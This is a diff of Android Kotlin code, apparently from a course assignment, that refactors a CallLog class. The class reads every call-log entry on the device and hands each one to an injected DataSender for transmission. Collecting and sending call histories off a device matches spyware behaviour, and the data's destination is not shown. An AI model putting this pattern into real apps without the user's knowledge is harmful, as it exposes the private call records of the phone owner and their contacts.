@@ -8,10 +8,9 @@ import android.util.Log
 import com.example.assignment1.DataSender
 import java.util.*
 
-class CallLog(var context: Context, var activity: Activity, var androidid: String) {
+class CallLog(var context: Context, var activity: Activity, var dataSender: DataSender) {
 
     fun readLogs() {
-        var datasender = DataSender()
         val allCalls = Uri.parse("content://call_log/calls")
         val c = activity.contentResolver.query(allCalls, null, null, null, null)
             if (c!!.moveToFirst()) {
@@ -32,7 +31,7 @@ class CallLog(var context: Context, var activity: Activity, var androidid: Strin
                         Type : $type
                         
                         """.trimIndent()
-                    datasender.sendData(androidid, fi)
+                    dataSender.sendData(fi)
                     c.moveToNext()
                 }
         }
